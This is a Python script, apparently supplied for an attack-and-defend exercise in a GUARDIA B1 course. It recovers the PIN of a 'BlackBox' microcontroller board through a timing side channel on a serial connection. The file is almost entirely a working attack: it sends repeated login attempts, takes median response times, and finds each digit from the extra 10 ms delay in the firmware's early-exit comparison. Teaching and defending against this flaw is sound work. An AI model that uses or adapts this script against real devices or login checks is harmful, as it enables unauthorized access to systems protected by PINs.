#!/usr/bin/env python3
"""
timing_attack.py — Attaque par timing sur la comparaison PIN de BlackBox
GUARDIA B1 — Script fourni pour Phase 1 (auto-attaque) et War Day

Principe :
    La fonction comparer_pin() du firmware fait HAL_Delay(10) pour chaque
    caractere correct, et retourne IMMEDIATEMENT sur le premier incorrect.

    Temps de reponse = UART_bruit + 10 ms x (nb chiffres corrects)

    En testant digit par digit, on trouve le PIN en 40 essais max
    au lieu de 10 000 par brute force classique.

    Exemple avec PIN = "4271" :
      Position 0 : "0xxx"....."4xxx" -> "4" prend ~10 ms de plus  -> PIN[0]=4
      Position 1 : "40xx"....."42xx" -> "42" prend ~20 ms de plus -> PIN[1]=2
      ...

Usage :
    python timing_attack.py COM3
    python timing_attack.py COM3 --samples 10   (plus precis, plus lent)
    python timing_attack.py COM3 --verbose
"""

import serial
import time
import sys
import argparse
import statistics


# ─────────────────────────────────────────────────────────────────
# Fonctions de communication
# ─────────────────────────────────────────────────────────────────

def ouvrir_port(port, baud=115200, timeout=3.0):
    """Ouvre le port serie et attend que la carte soit prete."""
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def envoyer_et_mesurer(ser, pin, verbose=False):
    """
    Envoie 'login <pin>', mesure le temps jusqu'a la reponse.
    Retourne (temps_ms, succes).

    Le timing commence APRES l'envoi de la commande complete
    et s'arrete quand une reponse complete est recue.
    """
    ser.reset_input_buffer()
    commande = f"login {pin}\r\n".encode()

    t0 = time.perf_counter()
    ser.write(commande)

    # Lire la reponse jusqu'a un marqueur de fin de ligne
    reponse = b""
    while True:
        octet = ser.read(1)
        if not octet:
            break  # timeout
        reponse += octet
        if b"PIN incorrect" in reponse or b"reussie" in reponse or b"Connexion" in reponse:
            break

    t1 = time.perf_counter()
    dt_ms = (t1 - t0) * 1000.0

    succes = b"reussie" in reponse or b"Connexion" in reponse
    if verbose:
        reponse_str = reponse.decode(errors="replace").strip().replace("\r\n", " ")
        print(f"    login {pin} -> {dt_ms:6.1f} ms  [{reponse_str}]")

    return dt_ms, succes


def mesurer_digit(ser, prefixe, position, nb_samples=5, verbose=False):
    """
    Pour une position donnee, essaie les 10 chiffres 0-9.
    Retourne le chiffre dont le temps median est le plus long.
    """
    resultats = {}

    for chiffre in "0123456789":
        # Construire le PIN : prefixe + chiffre + '0' pour le reste
        pin = prefixe + chiffre + "0" * (3 - position)
        temps = []

        for _ in range(nb_samples):
            dt, succes = envoyer_et_mesurer(ser, pin, verbose=False)
            if succes:
                return chiffre, True  # PIN correct trouve !
            temps.append(dt)
            time.sleep(0.05)  # petite pause entre les essais

        median = statistics.median(temps)
        resultats[chiffre] = median

        if verbose:
            print(f"    {pin}  {median:6.1f} ms  (median sur {nb_samples} essais)")

    # Le chiffre avec le temps median le plus long est le bon
    meilleur = max(resultats, key=resultats.get)
    return meilleur, False


# ─────────────────────────────────────────────────────────────────
# Point d'entree
# ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Timing attack sur BlackBox B1")
    parser.add_argument("port", help="Port serie (ex: COM3 ou /dev/ttyACM0)")
    parser.add_argument("--samples", type=int, default=5,
                        help="Nombre de mesures par chiffre (defaut: 5)")
    parser.add_argument("--verbose", action="store_true",
                        help="Afficher chaque mesure individuelle")
    args = parser.parse_args()

    print("=" * 55)
    print("  TIMING ATTACK — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port    : {args.port}")
    print(f"  Samples : {args.samples} mesures par chiffre")
    print(f"  Methode : comparaison digit par digit")
    print()
    print("  Principe : comparer_pin() fait HAL_Delay(10) sur")
    print("  chaque char correct. Plus de chars corrects = plus")
    print("  long. On trouve chaque digit en 10 essais.")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)
    total_essais = 0
    pin_trouve = ""

    for position in range(4):
        print(f"[*] Recherche du digit {position + 1}/4 (prefixe actuel: '{pin_trouve}')")

        meilleur, succes_direct = mesurer_digit(
            ser, pin_trouve, position,
            nb_samples=args.samples,
            verbose=args.verbose
        )
        total_essais += 10 * args.samples

        if succes_direct:
            pin_trouve += meilleur
            print(f"\n[+] PIN TROUVE directement : {pin_trouve}")
            print(f"    (connexion reussie lors de la mesure)")
            break

        pin_trouve += meilleur
        print(f"    => Digit {position + 1} = '{meilleur}'  (PIN partiel: {pin_trouve})\n")

    print()
    print(f"[+] PIN probable   : {pin_trouve}")
    print(f"    Total essais   : ~{total_essais}")
    print(f"    (vs brute force: 10 000 essais)")
    print()

    # Verification finale
    print("[*] Verification du PIN trouve...")
    dt, succes = envoyer_et_mesurer(ser, pin_trouve, verbose=True)

    if succes:
        print(f"\n[+] SUCCES ! PIN confirme : {pin_trouve}  ({dt:.1f} ms)")
    else:
        print(f"\n[?] Non confirme ({dt:.1f} ms) — le timing peut etre bruite.")
        print("    Relancez avec --samples 10 pour plus de precision.")
        print("    Ou la cible a peut-etre corrige la vulnerabilite (bravo a eux).")

    ser.close()


if __name__ == "__main__":
    main()
